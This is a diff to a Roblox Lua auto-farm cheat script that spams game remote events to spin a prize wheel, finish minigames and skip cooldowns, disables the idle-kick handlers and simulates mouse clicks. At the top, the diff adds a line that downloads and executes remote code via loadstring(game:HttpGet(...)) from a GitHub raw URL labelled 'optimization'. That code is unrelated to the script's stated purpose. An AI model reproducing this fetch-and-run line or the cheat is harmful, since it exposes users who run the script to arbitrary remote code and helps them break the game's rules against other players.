@@ -1,9 +1,22 @@
-AUTO_SPIN_WHEEL = true
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/refs/heads/main/optimization"))()
+end)
 
-local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local RunService = game:GetService("RunService")
+
+local remote = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
 local rf = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteFunction
 local re = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
+
+for _, x in pairs(getconnections(Players.LocalPlayer.Idled)) do 
+    x:Disable() 
+end
+
+AUTO_SPIN_WHEEL = true
 
 RunService.Heartbeat:Connect(function()
     if AUTO_SPIN_WHEEL then
@@ -11,5 +24,29 @@ RunService.Heartbeat:Connect(function()
             rf:InvokeServer("AutumnWheelSpin")
             re:FireServer("ClaimAutumnWheelSpinQueue")
         end)
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    remote:FireServer("FinishMinigame")
+end)
+
+RunService.Heartbeat:Connect(function()
+    remote:FireServer("SkipMinigameCooldown","Corn Maze")
+    remote:FireServer("StartMinigame","Corn Maze","Insane")
+    remote:FireServer("StartMinigame","Corn Maze","Insane")
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(60)
+        local screenSize = workspace.CurrentCamera.ViewportSize
+        local centerX = screenSize.X / 2
+        local centerY = screenSize.Y / 2
+        for i = 1, 10 do
+            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
+            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
+            task.wait(0.05)
+        end
     end
 end)
